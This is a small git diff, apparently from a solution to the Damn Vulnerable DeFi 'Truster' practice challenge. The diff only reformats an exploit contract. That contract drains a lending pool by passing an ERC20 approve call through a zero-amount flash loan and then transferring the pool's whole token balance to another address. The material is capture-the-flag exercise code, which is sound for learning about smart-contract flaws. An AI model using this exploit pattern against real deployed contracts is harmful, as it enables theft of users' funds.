@@ -8,9 +8,9 @@ import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 import {ERC20} from "solmate/tokens/ERC20.sol";
 
 contract TrustExploiter {
-    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recoverAddress){
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recoverAddress) {
         uint256 poolBalance = _token.balanceOf(address(_pool));
-        bytes memory data = abi.encodePacked(abi.encodeCall(ERC20.approve,(address(this), poolBalance)));
+        bytes memory data = abi.encodePacked(abi.encodeCall(ERC20.approve, (address(this), poolBalance)));
         _pool.flashLoan(0, address(this), address(_token), data);
         _token.transferFrom(address(_pool), _recoverAddress, poolBalance);
     }
